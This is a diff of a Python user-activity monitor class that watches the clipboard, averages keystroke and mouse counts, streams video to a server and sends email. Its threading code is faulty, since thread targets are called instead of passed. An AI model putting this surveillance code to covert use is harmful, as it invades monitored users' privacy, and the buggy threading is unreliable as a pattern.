@@ -76,15 +76,22 @@ class ActivityMonitor(Email, KeyMouse, CopyPolicy):
         self.password = password
         self.sender = sender
         self.receiver = receiver
-       
-   
-        #: instantiate the video class and calls the connect_to_server method in a different thread
-        video =Video(ip, port)
-        Thread(target=video.connect_to_server()).start()
 
-        #: instantiate the clipboard class and calls the run method in a different thread
+        
+        video =Video(ip, port)
         clipboard = Clipboard(on_text=self._on_text, on_image=self._on_image, on_file=self._on_file)
-        Thread(target=clipboard.run()).start()
+       
+        t_timer_10_mins = Thread(target=self._setTimer, args=(self.logUserActivities, self._LOG_INTERVAL, 'sec'))
+        t_timer_10_mins.start()
+        t_video = Thread(target=video.connect_to_server())
+        t_video.start()
+        t_clip = Thread(target=clipboard.run())
+        t_clip.start()
+
+        t_timer_10_mins.join()
+        t_video.join()
+        t_clip.join() 
+
 
     def _on_text(self, text:str):
         """
@@ -197,19 +204,19 @@ class ActivityMonitor(Email, KeyMouse, CopyPolicy):
         logs the users keystroke and mouseMove activities every 10 minutes
         """
 
-        # status = "active"
-        # keystroke, mouseMove= self.getAverage(60 * self._LOG_INTERVAL)
+        status = "active"
+        keystroke, mouseMove= self.getAverage(60 * self._LOG_INTERVAL)
+        print(keystroke, mouseMove)
 
-        # if not keystroke and not mouseMove:
-        #     status = "idle"
+        if not keystroke and not mouseMove:
+            status = "idle"
 
-        # print(f"keystroke:{keystroke}, mouseMoves:{mouseMove}, status:{status}")
-        print("logging user activities")
-
+        print(f"keystroke:{keystroke}, mouseMoves:{mouseMove}, status:{status}")
+        
     def disable_clipboard(self, disable=False):
         """
         Disables the clipboard for 24 hours
-        """
+        """                                                                            
         print("keyboard is disabled; can't copy file")
         
 
@@ -281,10 +288,10 @@ class ActivityMonitor(Email, KeyMouse, CopyPolicy):
     #     print("timer started") 
     
     def caller2(self):
-        print("caller fired")
         print(self.get_keyStrokeCount)
 
- 
+    @staticmethod
+    @timer
     def _setTimer(callback, inteval, mode):
         print("alarm triggeed!")
         
@@ -296,16 +303,12 @@ if __name__=="__main__":
     sender = os.environ["SENDER"]
     receiver = os.environ["RECEIVER"]
    
-    print(current_user)
     monitor = ActivityMonitor(ip, port, password, sender, receiver) 
 
-    #thread = Thread(target=monitor._setTimer, args=(monitor.logUserActivities, 1, 'sec'))
-    # #monitor._setTimer(monitor.logUserActivities, monitor._LOG_INTERVAL, 'sec')
-    # thread.start()
-    # thread.join() nnothing more tin ht egame can bring join other the love for christ
+   
     
 
-    monitor._setTimer(monitor.caller2, 10, 'sec')
+    # monitor._setTimer(monitor.caller2, 10, 'sec')
     
     
 
